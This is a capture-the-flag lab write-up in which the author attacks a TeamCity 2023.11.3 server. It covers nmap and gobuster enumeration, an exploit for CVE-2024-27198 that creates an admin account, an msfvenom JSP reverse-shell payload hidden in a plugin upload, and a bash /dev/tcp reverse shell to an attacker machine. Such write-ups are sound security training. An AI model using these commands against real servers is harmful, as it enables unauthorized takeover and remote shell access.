# Brains

## RED

### What is the content of flag.txt in the user's home folder?

Try enumeration on the target

```
nmap $TIP

Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-18 05:31 BST
Nmap scan report for ip-10-10-95-197.eu-west-1.compute.internal (10.10.95.197)
Host is up (0.032s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
50000/tcp open  ibm-db2
MAC Address: 02:1E:79:AD:80:01 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.33 seconds
```

There are open ports: 22(to ssh), 80(with HTTP!) and 50000 with ibm-db2? [DB2 docs](https://www.ibm.com/db2)

Port 80 is running Apache 2.4.41(Ubuntu) but it doesn't seems to have useful information.

Port 50000 starts with [TeamCity's](https://www.jetbrains.com/teamcity) login page, looking at the console of the browser's devTools is this message:
`Password fields present on an insecure (http://) page. This is a security risk that allows user login credentials to be stolen.`
It also reveals the TeamCity version: Version 2023.11.3 (build 147512)

A login attempt returns a 200, even if the login failed. The request body is

![](images/thm/brains/0.png)

That public key and encrypted password look interesting.

A MITM attack is possible because of HTTP use. Also, there are cookies

![](images/thm/brains/1.png)

And tons of .js scripts on every page.

Some gobuster

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://{target_IP}:50000
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.95.197:50000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 302) [Size: 0] [--> /admin/]
/agent                (Status: 401) [Size: 66]
/agents               (Status: 401) [Size: 66]
/build                (Status: 401) [Size: 66]
/changes              (Status: 401) [Size: 66]
/change               (Status: 401) [Size: 66]
/css                  (Status: 302) [Size: 0] [--> /css/]
/favicon.ico          (Status: 200) [Size: 5430]
/favorite             (Status: 401) [Size: 66]
/img                  (Status: 302) [Size: 0] [--> /img/]
/js                   (Status: 302) [Size: 0] [--> /js/]
/license              (Status: 302) [Size: 0] [--> /license/]
/learn                (Status: 401) [Size: 66]
/maintenance          (Status: 302) [Size: 0] [--> /maintenance/]
/oauth                (Status: 302) [Size: 0] [--> /oauth/]
/overview             (Status: 401) [Size: 66]
/plugins              (Status: 302) [Size: 0] [--> /plugins/]
/problems             (Status: 302) [Size: 0] [--> /problems/]
/profile              (Status: 302) [Size: 0] [--> /profile/]
/project              (Status: 401) [Size: 66]
/queue                (Status: 401) [Size: 66]
/status               (Status: 302) [Size: 0] [--> /status/]
/tests                (Status: 302) [Size: 0] [--> /tests/]
/test                 (Status: 401) [Size: 66]
/update               (Status: 403) [Size: 13]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

And some gobusting in port 80

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://{target_IP}:80
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.95.197:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 1069]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Nothing here.

I'll go back to TeamCity on port 50000, try to check for vulnerabilities on version 2023.11.3.
That's it. Found one [CVE-2024-27198](https://github.com/yoryio/CVE-2024-27198) that allow the
attacker to create an admin user under their control. Running the script

```
python CVE-2024-72198.py -t http://{target_IP}:50000 -u admin -p admin
[+] Version Found:  2023.11.3 (build 147512)
[+] Server vulnerable, returning HTTP 200
[+] New user admin created succesfully! Go to http://10.10.211.135:50000/login.html to login with your new credentials :)
```

Now, after logging in as the new user, I can create an access token for API requests to use in `Authorization: Bearer` header.

```
eyJ0eXAiOiAiVENWMiJ9.Z0VXRE1ZalJkaV9RNHlxdUJaTE9weEpLRTY0.MGMxMjcyZjgtMzlkMS00YTE0LWEwYjgtMGFkMGEzN2M4ODg5
```

But nothing comes from it.

There is a Plugins section: `admin/admin.html?item=plugins` and a zip can be uploaded. Maybe a reverse shell can be uploaded?

- With msfvenom: `msfvenom -p java/jsp_shell_reverse_tcp LHOST={attacking_machine_IP} LPORT=4444 -f raw > evil_shell.jsp` I can craft a
  Java reverse shell. How do I know that Java is the target? There is a 'Maven Support' listed on the plugins section.

- It turns out that a TeamCity plugin requires a special structure, not only to be zipped. It must be like this

```
|- server
|    |- <server plugin jar files>
|- teamcity-plugin.xml
```

Following the schema in the docs, we ended up with `teamcity-plugin.xml` looking like this

```
<?xml version="1.0" encoding="UTF-8"?>
<teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                 xsi:noNamespaceSchemaLocation="urn:schemas-jetbrains-com:teamcity-plugin-v1-xml">
  <info>

    <name>EvilShell</name> <!-- the name of plugin used in teamcity -->
    <display-name>Hackz!</display-name>
    <description>Some description goes here</description>
    <version>0.1</version>
  </info>
  <requirements min-build="147512" max-build="147512" /> <!-- specify compatible TeamCity server builds -->
  <deployment use-separate-classloader="true" allow-runtime-reload="true" /> <!-- load server plugin's classes in a separate classloader and reload a plugin without the server restart.-->
  <parameters>
    <parameter name="key">value</parameter>
    <!-- ... -->
  </parameters>
</teamcity-plugin>
```

I zipped all the stuff together following the plugin template and uploaded it as a plugin to the server. Unfortunaly, it didn't work.
Requesting /plugins/shell or /plugins/shell/evil_shell.jsp returned a 404 in both cases(even from curl with the bearer token from previous steps).

I also tried manually generating a new project with a custom command execution script to get a reverse shell but I couldn't
run it because there was no agent installed and I failed to install one.

What ended up working is this script [CVE-2024-27198-RCE](https://github.com/W01fh4cker/CVE-2024-27198-RCE/blob/main/CVE-2024-27198-RCE.py).
Once I've got shell access I started a netcat listener on the attacing machine `nc -lnvp 4444` and run this `sh -i >& /dev/tcp/{attacking_machine_IP}/4444 0>&1`(got it from revshells.com)
on the target shell. The flag was located at `/home/ubuntu`.

## BLUE

# References

- [DB2 docs](https://www.ibm.com/db2)
- [TeamCity](https://www.jetbrains.com/teamcity)
- [CVE-2024-27198](https://github.com/yoryio/CVE-2024-27198)
- [CVE-2024-27198 & CVE-2024-27199](https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/)
- [TeamCity Plugins Docs](https://plugins.jetbrains.com/docs/teamcity/plugins-packaging.html#Server-Side+Plugins)
- [CVE-2024-27198-RCE](https://github.com/W01fh4cker/CVE-2024-27198-RCE/blob/main/CVE-2024-27198-RCE.py)
